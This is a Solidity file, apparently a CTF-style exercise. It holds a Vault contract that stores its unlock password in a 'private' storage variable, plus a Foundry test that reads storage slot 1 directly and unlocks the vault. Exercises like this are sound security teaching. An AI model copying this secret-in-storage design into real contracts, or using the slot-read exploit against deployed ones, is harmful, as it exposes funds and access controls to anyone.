// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*==================== Original Contract Code ====================*/

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}

/*==================== Test ====================*/
import {Test, console} from "forge-std/Test.sol";

contract Task3Test is Test {
    Vault vault;

    function setUp() public {
        bytes32 _password = keccak256("password");
        vault = new Vault(_password);

        console.log("Password set by deployer:");
        console.logBytes32(_password);
        console.log("\n");
    }

    function testAttack() public {
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);

        assertTrue(!vault.locked(), "vault should be unlocked");
        
        console.log("Password read from storage:");
        console.logBytes32(password);
        console.log("\n");
    }
}